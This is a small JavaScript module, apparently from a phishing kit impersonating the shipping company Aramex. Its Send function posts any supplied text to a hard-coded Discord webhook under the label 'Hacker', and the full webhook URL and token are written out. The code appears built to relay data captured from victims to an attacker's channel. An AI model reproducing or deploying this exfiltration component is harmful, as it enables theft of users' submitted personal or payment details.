import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1337780531605012542/aFjoMUESLiZOQmBvmvmDSpUdFm-lUKFQWV7VOEkIToa1xLkVhC56yOakiXA-6sTLK8rG069904535694/B8iXi57-JN-cTcRw0D_uws8yPwTdZwBlguH-QvJsk_7WUNkzF_LwjIC9ZFjRG8IdekL-",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
